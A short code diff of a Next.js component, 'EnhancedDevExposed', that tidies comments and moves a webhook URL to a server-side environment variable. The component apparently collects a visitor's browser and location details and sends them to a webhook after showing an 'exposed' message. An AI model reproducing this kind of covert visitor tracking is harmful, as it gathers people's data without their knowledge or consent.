@@ -4,7 +4,7 @@ import { useState, useEffect } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import { useRouter } from "next/navigation";
 import Head from "next/head";
-import { Monitor, Globe, MapPin } from "lucide-react"; // Importing MapPin
+import { Monitor, Globe, MapPin } from "lucide-react";
 
 interface DevInfo {
     browser: string;
@@ -20,7 +20,7 @@ export default function EnhancedDevExposed() {
     const [exposed, setExposed] = useState<boolean>(false);
     const [exposeMessage, setExposeMessage] = useState<string>("");
     const [command, setCommand] = useState<string>("");
-    const [webhookUrl, setWebhookUrl] = useState<string>(process.env.NEXT_PUBLIC_WEBHOOK_URL || "");
+    const webhookUrl = process.env.WEBHOOK_URL;
 
     const router = useRouter();
 
@@ -73,8 +73,6 @@ export default function EnhancedDevExposed() {
         ];
         const randomLine = randomLines[Math.floor(Math.random() * randomLines.length)];
         setExposeMessage(randomLine);
-
-        // Send the data to the webhook
         sendToWebhook();
     };
 
